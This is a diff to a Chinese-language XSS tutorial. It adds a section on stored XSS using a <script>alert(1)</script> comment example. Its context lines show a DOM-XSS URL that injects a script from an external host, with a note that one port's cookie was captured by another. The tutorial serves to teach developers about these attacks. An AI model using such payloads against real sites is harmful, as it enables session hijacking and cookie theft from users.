@@ -22,3 +22,9 @@ http://127.0.0.1:8080/domTest.html#document.write("<script/src=//askybig.github.
 可以看到3000 端口的 Cookie 被 3001 拿到了。
 
 ![反射型](https://askybig.github.io/ImageStore/反射型.gif)
+
+### 存储型
+
+> 存储型也属于后端控制，对输入负责。
+
+如果没有做过滤，比如将数据库存储的某条评论 `<script>alert(1)</script>` 拼接在评论列表的 HTML 上，用户访问就会造成存储型 xss 攻击。
